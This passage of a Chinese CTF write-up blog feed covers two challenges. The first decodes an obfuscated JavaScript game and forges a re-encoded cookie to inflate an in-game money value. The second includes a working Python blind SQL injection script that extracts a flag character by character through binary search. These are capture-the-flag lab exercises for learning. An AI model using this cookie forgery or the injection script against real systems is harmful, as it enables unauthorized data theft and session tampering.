		<span class="hljs-keyword">return</span> (c &lt; <span class="hljs-number">62</span> ? <span class="hljs-string">''</span> : e(<span class="hljs-built_in">parseInt</span>(c / <span class="hljs-number">62</span>))) + ((c = c % <span class="hljs-number">62</span>) &gt; <span class="hljs-number">35</span> ? <span class="hljs-built_in">String</span>.fromCharCode(c + <span class="hljs-number">29</span>) : c.toString(<span class="hljs-number">36</span>))
	&#125;;
	<span class="hljs-keyword">if</span> (<span class="hljs-string">'0'</span>.replace(<span class="hljs-number">0</span>, e) == <span class="hljs-number">0</span>) &#123;
		<span class="hljs-keyword">while</span> (c--) r[e(c)] = k[c];
		k = [<span class="hljs-function"><span class="hljs-keyword">function</span>(<span class="hljs-params">e</span>) </span>&#123;
			<span class="hljs-keyword">return</span> r[e] || e
		&#125;];
		e = <span class="hljs-function"><span class="hljs-keyword">function</span>(<span class="hljs-params"></span>) </span>&#123;
			<span class="hljs-keyword">return</span> <span class="hljs-string">'[57-9abd-hj-zAB]'</span>
		&#125;;
		c = <span class="hljs-number">1</span>
	&#125;;
	<span class="hljs-keyword">while</span> (c--)
		<span class="hljs-keyword">if</span> (k[c]) p = p.replace(<span class="hljs-keyword">new</span> <span class="hljs-built_in">RegExp</span>(<span class="hljs-string">'\\b'</span> + e(c) + <span class="hljs-string">'\\b'</span>, <span class="hljs-string">'g'</span>), k[c]);
	<span class="hljs-keyword">return</span> p
&#125;(<span class="hljs-string">'7 s(t)&#123;5 m=t+"=";5 8=9.cookie.n(\';\');o(5 i=0;i&lt;8.d;i++)&#123;5 c=8[i].trim();u(c.v(m)==0)p c.substring(m.d,c.d)&#125;p""&#125;7 w(a)&#123;5 x=new Base64();5 q=x.decode(a);5 r="";o(i=0;i&lt;q.d;i++)&#123;5 b=q[i].charCodeAt();b=b^i;b=b-((i%10)+2);r+=String.fromCharCode(b)&#125;p r&#125;7 ertqwe()&#123;5 y="user";5 a=s(y);a=decodeURIComponent(a);5 z=w(a);5 8=z.n(\';\');5 e="";o(i=0;i&lt;8.d;i++)&#123;u(-1&lt;8[i].v("A"))&#123;e=8[i+1].n(":")[2]&#125;&#125;e=e.B(\'"\',"").B(\'"\',"");9.write(\'&lt;img id="f-1" g="h/1-1.k"&gt;\');j(7()&#123;9.l("f-1").g="h/1-2.k"&#125;,1000);j(7()&#123;9.l("f-1").g="h/1-3.k"&#125;,2000);j(7()&#123;9.l("f-1").g="h/1-4.k"&#125;,3000);j(7()&#123;9.l("f-1").g="h/6.png"&#125;,4000);j(7()&#123;alert("浣犱娇鐢ㄥ鏉ョ鎺屾墦璐ヤ簡钂欒€侀瓟锛屼絾涓嶇煡閬撴槸鐪熻韩杩樻槸鍋囪韩锛屾彁浜よ瘯涓€涓嬪惂!A&#123;"+md5(e)+"&#125;")&#125;,5000)&#125;'</span>, [], <span class="hljs-number">38</span>, <span class="hljs-string">'|||||var||function|ca|document|temp|num||length|key|attack|src|image||setTimeout|jpg|getElementById|name|split|for|return|result|result3|getCookie|cname|if|indexOf|decode_create|base|temp_name|mingwen|flag|replace'</span>.split(<span class="hljs-string">'|'</span>), <span class="hljs-number">0</span>, &#123;&#125;))</code></pre></div>

<p>可以看到<code>function(p, a, c, k, e, r)</code>函数有六个参数，而后面的一串字符可以发现是对应的六个实参，所以可以直接执行这段js代码，看看结果是什么。</p>
<div class="hljs"><pre><code class="hljs js">(<span class="hljs-string">'7 s(t)&#123;5 m=t+"=";5 8=9.cookie.n(\';\');o(5 i=0;i&lt;8.d;i++)&#123;5 c=8[i].trim();u(c.v(m)==0)p c.substring(m.d,c.d)&#125;p""&#125;7 w(a)&#123;5 x=new Base64();5 q=x.decode(a);5 r="";o(i=0;i&lt;q.d;i++)&#123;5 b=q[i].charCodeAt();b=b^i;b=b-((i%10)+2);r+=String.fromCharCode(b)&#125;p r&#125;7 ertqwe()&#123;5 y="user";5 a=s(y);a=decodeURIComponent(a);5 z=w(a);5 8=z.n(\';\');5 e="";o(i=0;i&lt;8.d;i++)&#123;u(-1&lt;8[i].v("A"))&#123;e=8[i+1].n(":")[2]&#125;&#125;e=e.B(\'"\',"").B(\'"\',"");9.write(\'&lt;img id="f-1" g="h/1-1.k"&gt;\');j(7()&#123;9.l("f-1").g="h/1-2.k"&#125;,1000);j(7()&#123;9.l("f-1").g="h/1-3.k"&#125;,2000);j(7()&#123;9.l("f-1").g="h/1-4.k"&#125;,3000);j(7()&#123;9.l("f-1").g="h/6.png"&#125;,4000);j(7()&#123;alert("浣犱娇鐢ㄥ鏉ョ鎺屾墦璐ヤ簡钂欒€侀瓟锛屼絾涓嶇煡閬撴槸鐪熻韩杩樻槸鍋囪韩锛屾彁浜よ瘯涓€涓嬪惂!A&#123;"+md5(e)+"&#125;")&#125;,5000)&#125;'</span>, [], <span class="hljs-number">38</span>, <span class="hljs-string">'|||||var||function|ca|document|temp|num||length|key|attack|src|image||setTimeout|jpg|getElementById|name|split|for|return|result|result3|getCookie|cname|if|indexOf|decode_create|base|temp_name|mingwen|flag|replace'</span>.split(<span class="hljs-string">'|'</span>), <span class="hljs-number">0</span>, &#123;&#125;)</code></pre></div>



<p>删除eval在浏览器的控制台跑出的结果</p>
<p><img src="https://i.loli.net/2020/11/25/gPRY2r7G1LdtecT.png" srcset="/img/loading.gif" alt="mt-4.png"></p>
<p>在线代码格式化后如下</p>
<div class="hljs"><pre><code class="hljs js"><span class="hljs-function"><span class="hljs-keyword">function</span> <span class="hljs-title">getCookie</span>(<span class="hljs-params">cname</span>) </span>&#123;
    <span class="hljs-keyword">var</span> name = cname + <span class="hljs-string">"="</span>;
    <span class="hljs-keyword">var</span> ca = <span class="hljs-built_in">document</span>.cookie.split(<span class="hljs-string">';'</span>);
    <span class="hljs-keyword">for</span> (<span class="hljs-keyword">var</span> i = <span class="hljs-number">0</span>; i &lt; ca.length; i++) &#123;
        <span class="hljs-keyword">var</span> c = ca[i].trim();
        <span class="hljs-keyword">if</span> (c.indexOf(name) == <span class="hljs-number">0</span>) <span class="hljs-keyword">return</span> c.substring(name.length, c.length)
    &#125;
    <span class="hljs-keyword">return</span> <span class="hljs-string">""</span>
&#125;

<span class="hljs-function"><span class="hljs-keyword">function</span> <span class="hljs-title">decode_create</span>(<span class="hljs-params">temp</span>) </span>&#123;
    <span class="hljs-keyword">var</span> base = <span class="hljs-keyword">new</span> Base64();
    <span class="hljs-keyword">var</span> result = base.decode(temp);
    <span class="hljs-keyword">var</span> result3 = <span class="hljs-string">""</span>;
    <span class="hljs-keyword">for</span> (i = <span class="hljs-number">0</span>; i &lt; result.length; i++) &#123;
        <span class="hljs-keyword">var</span> num = result[i].charCodeAt();
        num = num ^ i;
        num = num - ((i % <span class="hljs-number">10</span>) + <span class="hljs-number">2</span>);
        result3 += <span class="hljs-built_in">String</span>.fromCharCode(num)
    &#125;
    <span class="hljs-keyword">return</span> result3
&#125;

<span class="hljs-function"><span class="hljs-keyword">function</span> <span class="hljs-title">ertqwe</span>(<span class="hljs-params"></span>) </span>&#123;
    <span class="hljs-keyword">var</span> temp_name = <span class="hljs-string">"user"</span>;
    <span class="hljs-keyword">var</span> temp = getCookie(temp_name);
    temp = <span class="hljs-built_in">decodeURIComponent</span>(temp);
    <span class="hljs-keyword">var</span> mingwen = decode_create(temp);
    <span class="hljs-keyword">var</span> ca = mingwen.split(<span class="hljs-string">';'</span>);
    <span class="hljs-keyword">var</span> key = <span class="hljs-string">""</span>;
    <span class="hljs-keyword">for</span> (i = <span class="hljs-number">0</span>; i &lt; ca.length; i++) &#123;
        <span class="hljs-keyword">if</span> (<span class="hljs-number">-1</span> &lt; ca[i].indexOf(<span class="hljs-string">"flag"</span>)) &#123;
            key = ca[i + <span class="hljs-number">1</span>].split(<span class="hljs-string">":"</span>)[<span class="hljs-number">2</span>]
        &#125;
    &#125;
    key = key.replace(<span class="hljs-string">'"'</span>, <span class="hljs-string">""</span>).replace(<span class="hljs-string">'"'</span>, <span class="hljs-string">""</span>);
    <span class="hljs-built_in">document</span>.write(<span class="hljs-string">'&lt;img id="attack-1" src="image/1-1.jpg"&gt;'</span>);
    setTimeout(<span class="hljs-function"><span class="hljs-keyword">function</span> (<span class="hljs-params"></span>) </span>&#123;
        <span class="hljs-built_in">document</span>.getElementById(<span class="hljs-string">"attack-1"</span>).src = <span class="hljs-string">"image/1-2.jpg"</span>
    &#125;, <span class="hljs-number">1000</span>);
    setTimeout(<span class="hljs-function"><span class="hljs-keyword">function</span> (<span class="hljs-params"></span>) </span>&#123;
        <span class="hljs-built_in">document</span>.getElementById(<span class="hljs-string">"attack-1"</span>).src = <span class="hljs-string">"image/1-3.jpg"</span>
    &#125;, <span class="hljs-number">2000</span>);
    setTimeout(<span class="hljs-function"><span class="hljs-keyword">function</span> (<span class="hljs-params"></span>) </span>&#123;
        <span class="hljs-built_in">document</span>.getElementById(<span class="hljs-string">"attack-1"</span>).src = <span class="hljs-string">"image/1-4.jpg"</span>
    &#125;, <span class="hljs-number">3000</span>);
    setTimeout(<span class="hljs-function"><span class="hljs-keyword">function</span> (<span class="hljs-params"></span>) </span>&#123;
        <span class="hljs-built_in">document</span>.getElementById(<span class="hljs-string">"attack-1"</span>).src = <span class="hljs-string">"image/6.png"</span>
    &#125;, <span class="hljs-number">4000</span>);
    setTimeout(<span class="hljs-function"><span class="hljs-keyword">function</span> (<span class="hljs-params"></span>) </span>&#123;
        alert(<span class="hljs-string">"浣犱娇鐢ㄥ鏉ョ鎺屾墦璐ヤ簡钂欒€侀瓟锛屼絾涓嶇煡閬撴槸鐪熻韩杩樻槸鍋囪韩锛屾彁浜よ瘯涓€涓嬪惂!flag&#123;"</span> + md5(key) + <span class="hljs-string">"&#125;"</span>)    <span class="hljs-comment">//发现了flag字段  </span>
    &#125;, <span class="hljs-number">5000</span>)
&#125;</code></pre></div>

<p>首先在控制台中获取cookie</p>
<div class="hljs"><pre><code class="hljs abnf">getCookie(<span class="hljs-string">"user"</span>)<span class="hljs-comment">;</span></code></pre></div>



<p><img src="https://i.loli.net/2020/11/25/YAdm9g1Z8R7MXIk.png" srcset="/img/loading.gif" alt></p>
<p>获取cookie，使用上面的js代码一步一步解码</p>
<p>最后会获取序列化后的一串字符串</p>
<p><img src="https://i.loli.net/2020/11/25/ceNDwnU2LAVkv5Z.png" srcset="/img/loading.gif" alt="mt-5.png"></p>
<p>最后解出来的cookie值</p>
<div class="hljs"><pre><code class="hljs css"><span class="hljs-selector-tag">O</span><span class="hljs-selector-pseudo">:5</span><span class="hljs-selector-pseudo">:"human"</span><span class="hljs-selector-pseudo">:10</span>:&#123;<span class="hljs-attribute">s</span>:<span class="hljs-number">8</span>:<span class="hljs-string">"xueliang"</span>;<span class="hljs-attribute">i</span>:<span class="hljs-number">615</span>;<span class="hljs-attribute">s</span>:<span class="hljs-number">5</span>:<span class="hljs-string">"neili"</span>;<span class="hljs-attribute">i</span>:<span class="hljs-number">657</span>;<span class="hljs-attribute">s</span>:<span class="hljs-number">5</span>:<span class="hljs-string">"lidao"</span>;<span class="hljs-attribute">i</span>:<span class="hljs-number">76</span>;<span class="hljs-attribute">s</span>:<span class="hljs-number">6</span>:<span class="hljs-string">"dingli"</span>;<span class="hljs-attribute">i</span>:<span class="hljs-number">72</span>;<span class="hljs-attribute">s</span>:<span class="hljs-number">7</span>:<span class="hljs-string">"waigong"</span>;<span class="hljs-attribute">i</span>:<span class="hljs-number">0</span>;<span class="hljs-attribute">s</span>:<span class="hljs-number">7</span>:<span class="hljs-string">"neigong"</span>;<span class="hljs-attribute">i</span>:<span class="hljs-number">0</span>;<span class="hljs-attribute">s</span>:<span class="hljs-number">7</span>:<span class="hljs-string">"jingyan"</span>;<span class="hljs-attribute">i</span>:<span class="hljs-number">0</span>;<span class="hljs-attribute">s</span>:<span class="hljs-number">6</span>:<span class="hljs-string">"yelian"</span>;<span class="hljs-attribute">i</span>:<span class="hljs-number">0</span>;<span class="hljs-attribute">s</span>:<span class="hljs-number">5</span>:<span class="hljs-string">"money"</span>;<span class="hljs-attribute">i</span>:<span class="hljs-number">0</span>;<span class="hljs-attribute">s</span>:<span class="hljs-number">4</span>:<span class="hljs-string">"flag"</span>;<span class="hljs-attribute">s</span>:<span class="hljs-number">1</span>:<span class="hljs-string">"0"</span>;&#125;</code></pre></div>

<p>但是会发现money的值为0，所以下面的思路就是通过修改cookie中money值之后反编码成题目中的格式，抓包修改cookie后买技能打怪拿到flag</p>
<p>改cookie的方法就是将明文逆向编码：</p>
<p>刚开始写了挺久的逆向解密，发现调用base64中的encode时，怎么也解不出原来的加密代码，encode怎么也加密不出原来的cookie。<br>猜想一定是base64.js有问题：</p>
<p>发现加密过程并不对应，encode调用了_utf8_encode<br>但decode并没有调用_utf8_encode，所以需要对编码过程进行相应的修改</p>
<p><img src="https://i.loli.net/2020/11/25/GWgjr69lpYb74cT.png" srcset="/img/loading.gif" alt="mt-7.png"></p>
<p><strong>修改后的反编码过程</strong>，将其放到html文件中，浏览器运行即可出结果</p>
<div class="hljs"><pre><code class="hljs html">//1.html
<span class="hljs-tag">&lt;<span class="hljs-name">script</span>&gt;</span>

<span class="actionscript"><span class="hljs-function"><span class="hljs-keyword">function</span> <span class="hljs-title">Base64</span><span class="hljs-params">()</span> </span>&#123;</span>
 
<span class="actionscript">	<span class="hljs-comment">// private property</span></span>
<span class="actionscript">	_keyStr = <span class="hljs-string">"ABCDEFGHIJKLMNOPQRSTUVWXYZabcdefghijklmnopqrstuvwxyz0123456789+/="</span>;</span>
 
<span class="actionscript">	<span class="hljs-comment">// public method for encoding</span></span>
<span class="actionscript">	<span class="hljs-keyword">this</span>.encode = <span class="hljs-function"><span class="hljs-keyword">function</span> <span class="hljs-params">(input)</span> </span>&#123;</span>
<span class="actionscript">		<span class="hljs-keyword">var</span> output = <span class="hljs-string">""</span>;</span>
<span class="actionscript">		<span class="hljs-keyword">var</span> chr1, chr2, chr3, enc1, enc2, enc3, enc4;</span>
<span class="actionscript">		<span class="hljs-keyword">var</span> i = <span class="hljs-number">0</span>;</span>
<span class="actionscript">		<span class="hljs-comment">//input = _utf8_encode(input); (注释掉这个函数调用)</span></span>
<span class="actionscript">		<span class="hljs-keyword">while</span> (i &lt; input.length) &#123;</span>
			chr1 = input.charCodeAt(i++);
			chr2 = input.charCodeAt(i++);
			chr3 = input.charCodeAt(i++);
			enc1 = chr1 &gt;&gt; 2;
<span class="handlebars"><span class="xml">			enc2 = ((chr1 &amp; 3) <span class="hljs-tag">&lt;&lt; <span class="hljs-attr">4</span>) | (<span class="hljs-attr">chr2</span> &gt;</span>&gt; 4);</span></span>
<span class="handlebars"><span class="xml">			enc3 = ((chr2 &amp; 15) <span class="hljs-tag">&lt;&lt; <span class="hljs-attr">2</span>) | (<span class="hljs-attr">chr3</span> &gt;</span>&gt; 6);</span></span>
			enc4 = chr3 &amp; 63;
<span class="javascript">			<span class="hljs-keyword">if</span> (<span class="hljs-built_in">isNaN</span>(chr2)) &#123;</span>
				enc3 = enc4 = 64;
<span class="javascript">			&#125; <span class="hljs-keyword">else</span> <span class="hljs-keyword">if</span> (<span class="hljs-built_in">isNaN</span>(chr3)) &#123;</span>
				enc4 = 64;
			&#125;
			output = output +
			_keyStr.charAt(enc1) + _keyStr.charAt(enc2) +
			_keyStr.charAt(enc3) + _keyStr.charAt(enc4);
		&#125;
<span class="actionscript">		<span class="hljs-keyword">return</span> output;</span>
	&#125;
 
<span class="actionscript">	<span class="hljs-comment">// public method for decoding</span></span>
<span class="actionscript">	<span class="hljs-keyword">this</span>.decode = <span class="hljs-function"><span class="hljs-keyword">function</span> <span class="hljs-params">(input)</span> </span>&#123;</span>
<span class="actionscript">		<span class="hljs-keyword">var</span> output = <span class="hljs-string">""</span>;</span>
<span class="actionscript">		<span class="hljs-keyword">var</span> chr1, chr2, chr3;</span>
<span class="actionscript">		<span class="hljs-keyword">var</span> enc1, enc2, enc3, enc4;</span>
<span class="actionscript">		<span class="hljs-keyword">var</span> i = <span class="hljs-number">0</span>;</span>
<span class="javascript">		input = input.replace(<span class="hljs-regexp">/[^A-Za-z0-9\+\/\=]/g</span>, <span class="hljs-string">""</span>);</span>
<span class="actionscript">		<span class="hljs-keyword">while</span> (i &lt; input.length) &#123;</span>
			enc1 = _keyStr.indexOf(input.charAt(i++));
			enc2 = _keyStr.indexOf(input.charAt(i++));
			enc3 = _keyStr.indexOf(input.charAt(i++));
			enc4 = _keyStr.indexOf(input.charAt(i++));
<span class="handlebars"><span class="xml">			chr1 = (enc1 <span class="hljs-tag">&lt;&lt; <span class="hljs-attr">2</span>) | (<span class="hljs-attr">enc2</span> &gt;</span>&gt; 4);</span></span>
<span class="handlebars"><span class="xml">			chr2 = ((enc2 &amp; 15) <span class="hljs-tag">&lt;&lt; <span class="hljs-attr">4</span>) | (<span class="hljs-attr">enc3</span> &gt;</span>&gt; 2);</span></span>
			chr3 = ((enc3 &amp; 3) &lt;&lt; 6) | enc4;
<span class="javascript">			output = output + <span class="hljs-built_in">String</span>.fromCharCode(chr1);</span>
			if (enc3 != 64) &#123;
<span class="javascript">				output = output + <span class="hljs-built_in">String</span>.fromCharCode(chr2);</span>
			&#125;
			if (enc4 != 64) &#123;
<span class="javascript">				output = output + <span class="hljs-built_in">String</span>.fromCharCode(chr3);</span>
			&#125;
		&#125;
<span class="actionscript">		<span class="hljs-comment">//output = _utf8_decode(output);</span></span>
<span class="actionscript">		<span class="hljs-keyword">return</span> output;</span>
	&#125;
 
<span class="actionscript">	<span class="hljs-comment">// private method for UTF-8 encoding</span></span>
<span class="actionscript">	_utf8_encode = <span class="hljs-function"><span class="hljs-keyword">function</span> <span class="hljs-params">(string)</span> </span>&#123;</span>
<span class="javascript">		string = string.replace(<span class="hljs-regexp">/\r\n/g</span>,<span class="hljs-string">"\n"</span>);</span>
<span class="actionscript">		<span class="hljs-keyword">var</span> utftext = <span class="hljs-string">""</span>;</span>
<span class="actionscript">		<span class="hljs-keyword">for</span> (<span class="hljs-keyword">var</span> n = <span class="hljs-number">0</span>; n &lt; string.length; n++) &#123;</span>
<span class="actionscript">			<span class="hljs-keyword">var</span> c = string.charCodeAt(n);</span>
			if (c &lt; 128) &#123;
<span class="javascript">				utftext += <span class="hljs-built_in">String</span>.fromCharCode(c);</span>
<span class="actionscript">			&#125; <span class="hljs-keyword">else</span> <span class="hljs-keyword">if</span>((c &gt; <span class="hljs-number">127</span>) &amp;&amp; (c &lt; <span class="hljs-number">2048</span>)) &#123;</span>
<span class="javascript">				utftext += <span class="hljs-built_in">String</span>.fromCharCode((c &gt;&gt; <span class="hljs-number">6</span>) | <span class="hljs-number">192</span>);</span>
<span class="javascript">				utftext += <span class="hljs-built_in">String</span>.fromCharCode((c &amp; <span class="hljs-number">63</span>) | <span class="hljs-number">128</span>);</span>
<span class="actionscript">			&#125; <span class="hljs-keyword">else</span> &#123;</span>
<span class="javascript">				utftext += <span class="hljs-built_in">String</span>.fromCharCode((c &gt;&gt; <span class="hljs-number">12</span>) | <span class="hljs-number">224</span>);</span>
<span class="javascript">				utftext += <span class="hljs-built_in">String</span>.fromCharCode(((c &gt;&gt; <span class="hljs-number">6</span>) &amp; <span class="hljs-number">63</span>) | <span class="hljs-number">128</span>);</span>
<span class="javascript">				utftext += <span class="hljs-built_in">String</span>.fromCharCode((c &amp; <span class="hljs-number">63</span>) | <span class="hljs-number">128</span>);</span>
			&#125;
 
		&#125;
<span class="actionscript">		<span class="hljs-keyword">return</span> utftext;</span>
	&#125;
 
<span class="actionscript">	<span class="hljs-comment">// private method for UTF-8 decoding</span></span>
<span class="actionscript">	_utf8_decode = <span class="hljs-function"><span class="hljs-keyword">function</span> <span class="hljs-params">(utftext)</span> </span>&#123;</span>
<span class="actionscript">		<span class="hljs-keyword">var</span> string = <span class="hljs-string">""</span>;</span>
<span class="actionscript">		<span class="hljs-keyword">var</span> i = <span class="hljs-number">0</span>;</span>
<span class="actionscript">		<span class="hljs-keyword">var</span> c = c1 = c2 = <span class="hljs-number">0</span>;</span>
<span class="actionscript">		<span class="hljs-keyword">while</span> ( i &lt; utftext.length ) &#123;</span>
			c = utftext.charCodeAt(i);
			if (c &lt; 128) &#123;
<span class="javascript">				string += <span class="hljs-built_in">String</span>.fromCharCode(c);</span>
				i++;
<span class="actionscript">			&#125; <span class="hljs-keyword">else</span> <span class="hljs-keyword">if</span>((c &gt; <span class="hljs-number">191</span>) &amp;&amp; (c &lt; <span class="hljs-number">224</span>)) &#123;</span>
				c2 = utftext.charCodeAt(i+1);
<span class="javascript">				string += <span class="hljs-built_in">String</span>.fromCharCode(((c &amp; <span class="hljs-number">31</span>) &lt;&lt; <span class="hljs-number">6</span>) | (c2 &amp; <span class="hljs-number">63</span>));</span>
				i += 2;
<span class="actionscript">			&#125; <span class="hljs-keyword">else</span> &#123;</span>
				c2 = utftext.charCodeAt(i+1);
				c3 = utftext.charCodeAt(i+2);
<span class="javascript">				string += <span class="hljs-built_in">String</span>.fromCharCode(((c &amp; <span class="hljs-number">15</span>) &lt;&lt; <span class="hljs-number">12</span>) | ((c2 &amp; <span class="hljs-number">63</span>) &lt;&lt; <span class="hljs-number">6</span>) | (c3 &amp; <span class="hljs-number">63</span>));</span>
				i += 3;
			&#125;
		&#125;
<span class="actionscript">		<span class="hljs-keyword">return</span> string;</span>
	&#125;
&#125;


<span class="actionscript"><span class="hljs-comment">//原来cookie</span></span>
<span class="actionscript"><span class="hljs-keyword">var</span> temp = <span class="hljs-string">"UTw7PCxqe3FjcC42OThOjWtSUFYwbm99amlzbG0wI3MeHBsUZ1liZxQMWEFDXl8EdUUOCgACd016B34WUlFWWTVoATEAAXF5P3Z2CmYgPTY5Pj90FSUUaGUfL2ZnYnYhCRMTGRQPQCcHKFIvEShXUlYCGQMbDQ4FXEcXREo/BTzBxKbu6fbrB+H+ps3nsLrP6dCs0LgR8fj1/+6y3+/apJ3XnJnkjNPf0NnRjpPD7pjzzfaMiJDcxt/XkP/B+I2C5vTqgUE="</span>;</span>
<span class="actionscript"><span class="hljs-comment">//进行加密，获取明文</span></span>

<span class="actionscript"><span class="hljs-keyword">var</span> base = <span class="hljs-keyword">new</span> Base64();</span>
<span class="actionscript"><span class="hljs-keyword">var</span> result = base.decode(temp);</span>
<span class="actionscript"><span class="hljs-keyword">var</span> result3 = <span class="hljs-string">""</span>;</span>
for (i = 0; i &lt; result.length; i++) &#123;
<span class="actionscript">	<span class="hljs-keyword">var</span> num = result[i].charCodeAt();</span>
	num = num ^ i;
	num = num - ((i % 10) + 2);
<span class="javascript">	result3 += <span class="hljs-built_in">String</span>.fromCharCode(num);</span>
&#125;
    
<span class="javascript"><span class="hljs-built_in">document</span>.write(<span class="hljs-string">"原明文："</span>+result3+<span class="hljs-string">'&lt;br/&gt;'</span>);</span>
<span class="javascript"><span class="hljs-built_in">document</span>.write(<span class="hljs-string">'&lt;br/&gt;'</span>);</span>

<span class="actionscript"><span class="hljs-keyword">var</span> result3 = <span class="hljs-string">'O:5:"human":10:&#123;s:8:"xueliang";i:830;s:5:"neili";i:602;s:5:"lidao";i:95;s:6:"dingli";i:63;s:7:"waigong";i:0;s:7:"neigong";i:0;s:7:"jingyan";i:0;s:6:"yelian";i:0;s:5:"money";i:200000;s:4:"flag";s:1:"0";&#125;'</span>;</span>
<span class="actionscript"><span class="hljs-comment">//反编码获取cookie</span></span>
<span class="actionscript"><span class="hljs-keyword">var</span> result = <span class="hljs-string">""</span>;</span>
for (i = 0;i&lt;result3.length;i++)&#123;
	num = result3[i].charCodeAt();
	num = num + ((i % 10) + 2);
	num = num ^ i;
<span class="javascript">	result += <span class="hljs-built_in">String</span>.fromCharCode(num);</span>
&#125;
<span class="actionscript"><span class="hljs-keyword">var</span> temp= base.encode(result);</span>

<span class="actionscript"><span class="hljs-comment">//将cookie进行url编码</span></span>
<span class="javascript">temp = <span class="hljs-built_in">encodeURIComponent</span>(temp);</span>
<span class="javascript"><span class="hljs-built_in">document</span>.write(<span class="hljs-string">"cookie:"</span>+temp+<span class="hljs-string">"&lt;/br&gt;"</span>);</span>
<span class="hljs-tag">&lt;/<span class="hljs-name">script</span>&gt;</span></code></pre></div>



<p>编码结果</p>
<div class="hljs"><pre><code class="hljs gcode">UTw<span class="hljs-number">7</span>PCxqe<span class="hljs-number">3</span>FjcC<span class="hljs-number">42</span>OThOjWtSUFYwb<span class="hljs-name">m99</span>amlzb<span class="hljs-name">G0</span>wI<span class="hljs-number">3</span>MeHBsUZ<span class="hljs-number">1</span>liZxQMWEFDXl<span class="hljs-number">8</span>EdUUOCgACd<span class="hljs-number">016</span>B<span class="hljs-number">34</span>WUlFWWTVoATEAAXF<span class="hljs-number">5</span>P<span class="hljs-number">3</span>Z<span class="hljs-number">2</span>CmYgPTY<span class="hljs-number">5</span>Pj<span class="hljs-number">90</span>FSUUaGUfL<span class="hljs-number">2</span>Z<span class="hljs-symbol">nYnYhCRMTGRQPQCcHKFIvEShXUlYCGQMbDQ4</span>FXEcXREo<span class="hljs-meta">%</span><span class="hljs-number">2</span>FBTzBxKbu<span class="hljs-number">6</span>fbrB<span class="hljs-meta">%</span><span class="hljs-number">2</span>BH<span class="hljs-meta">%</span><span class="hljs-number">2</span>Bps<span class="hljs-number">3</span><span class="hljs-symbol">nsLrP6</span>dCs<span class="hljs-number">0</span>LgR<span class="hljs-number">8</span>fj<span class="hljs-number">1</span><span class="hljs-meta">%</span><span class="hljs-number">2</span>F<span class="hljs-meta">%</span><span class="hljs-number">2</span>B<span class="hljs-number">6</span>y<span class="hljs-number">3</span><span class="hljs-meta">%</span><span class="hljs-number">2</span>B<span class="hljs-meta">%</span><span class="hljs-number">2</span>FapJ<span class="hljs-number">3</span>X<span class="hljs-symbol">nJnkjNPf0</span><span class="hljs-symbol">NnRjpPD7</span>paIiIiIhovBiIL<span class="hljs-number">4</span>k<span class="hljs-symbol">NTK0</span>dea<span class="hljs-meta">%</span><span class="hljs-number">2</span>F<span class="hljs-number">7</span>mC<span class="hljs-meta">%</span><span class="hljs-number">2</span>B<span class="hljs-number">4</span>bu<span class="hljs-meta">%</span><span class="hljs-number">2</span>FOr<span class="hljs-number">1</span>SQ<span class="hljs-meta">%</span><span class="hljs-number">3</span>D<span class="hljs-meta">%</span><span class="hljs-number">3</span>D</code></pre></div>

<p>这就是我们期待的cookie,然后用工具修改cookie</p>
<p><img src="https://i.loli.net/2020/11/25/WMk48YRo5veBxXr.png" srcset="/img/loading.gif" alt="nt-9.png"></p>
<p>修满属性值打怪拿到flag</p>
<p><img src="https://i.loli.net/2020/11/25/5Geyh8r7vBDOqKE.png" srcset="/img/loading.gif" alt="mt-10.png"></p>
<p><a href="https://blog.csdn.net/weixin_41924764/article/details/109488408?utm_medium=distribute.pc_relevant.none-task-blog-title-2&spm=1001.2101.3001.4242" target="_blank" rel="noopener">参考</a></p>
<p>这道题虽然很难，但是在一步一步尝试的过程中学到很多有用的东西，收获还是很大的，感谢师傅的wp，看了好久才做出了。</p>
]]></content>
      <categories>
        <category>ctf</category>
      </categories>
      <tags>
        <tag>脚本</tag>
        <tag>php</tag>
        <tag>cookie</tag>
        <tag>编码</tag>
      </tags>
  </entry>
  <entry>
    <title>buuctf-LFI</title>
    <url>/2020/10/08/buuoj-LFI/</url>
    <content><![CDATA[]]></content>
      <categories>
        <category>ctf</category>
      </categories>
      <tags>
        <tag>LFI</tag>
      </tags>
  </entry>
  <entry>
    <title>buuctf-sql注入</title>
    <url>/2020/10/05/buuoj/</url>
    <content><![CDATA[<h1 id="buuctf–注入篇"><a href="#buuctf–注入篇" class="headerlink" title="buuctf–注入篇"></a>buuctf–注入篇</h1><a id="more"></a>

<h2 id="CISCN2019-华北赛区-Day2-Web1-Hack-World"><a href="#CISCN2019-华北赛区-Day2-Web1-Hack-World" class="headerlink" title="[CISCN2019 华北赛区 Day2 Web1]Hack World"></a>[CISCN2019 华北赛区 Day2 Web1]Hack World</h2><p>给了提示，<code>All You Want Is In Table &#39;flag&#39; and the column is &#39;flag&#39;</code></p>
<p>猜测flag在flag 表中，查询语句应该是 select flag from flag</p>
<p>经过测试，发现这题过滤了很多关键字，or,union,order等，猜测是盲注</p>
<p><img src="/2020/10/05/buuoj/fuzz.png" srcset="/img/loading.gif" alt></p>
<p>构造盲注语句</p>
<p><code>id=if((ascii(substr((select(flag)from(flag)),0,1))&gt;90),1,2)</code></p>
<p><img src="/2020/10/05/buuoj/1.png" srcset="/img/loading.gif" alt></p>
<p><img src="/2020/10/05/buuoj/2.png" srcset="/img/loading.gif" alt></p>
<p>两次的提示语句不一样，说明这个注入语句是对的，且当提示Hello时应该是对的。</p>
<div class="hljs"><pre><code class="hljs python">// 二分注入
<span class="hljs-keyword">import</span> requests

url = <span class="hljs-string">"http://376688f4-59c4-4f47-8d0e-36c966e45631.node3.buuoj.cn/index.php"</span>

data = &#123;id : <span class="hljs-string">""</span>&#125;

flag = <span class="hljs-string">""</span>
<span class="hljs-keyword">for</span> i <span class="hljs-keyword">in</span> range(<span class="hljs-number">50</span>):
    left = <span class="hljs-number">33</span>
    right = <span class="hljs-number">128</span>
    mid = (right + left) &gt;&gt; <span class="hljs-number">1</span>
    <span class="hljs-keyword">while</span>(right&gt;left):

        data[<span class="hljs-string">"id"</span>] = <span class="hljs-string">"if((ascii(substr((select(flag)from(flag)),&#123;0&#125;,1))&gt;&#123;1&#125;),1,2)"</span>.format(i,mid)
        response = requests.post(url,data=data)
        <span class="hljs-keyword">if</span> <span class="hljs-string">"Hello"</span> <span class="hljs-keyword">in</span> response.text:
            left = mid+<span class="hljs-number">1</span>
        <span class="hljs-keyword">else</span>:
            right = mid
        mid=(right+left)&gt;&gt;<span class="hljs-number">1</span>
    flag = flag + chr(mid)
    print(flag)

print(flag)</code></pre></div>





